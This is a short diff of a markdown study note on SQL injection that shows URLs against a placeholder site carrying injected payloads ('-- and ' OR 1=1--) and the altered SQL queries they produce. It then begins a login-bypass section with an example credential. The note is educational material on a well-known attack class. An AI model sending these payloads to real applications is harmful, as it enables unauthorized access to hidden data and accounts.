@@ -1,13 +1,10 @@
 # **SQL Injection** 
 ### Retrieving hidden data, where can modify an SQL query to return additional results 
 [https://insecure-website.com/products?category=Gifts]
-
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
 [https://insecure-website.com/products?category=Gifts%27--]
-
 `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1` 
 [https://insecure-website.com/products?category=Gifts%27+OR+1=1--]
-
 `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` 
 ### Subverting application logic, where you can change a query to interfere with the application's logic
  If a users credential is wiener:bluecheese 
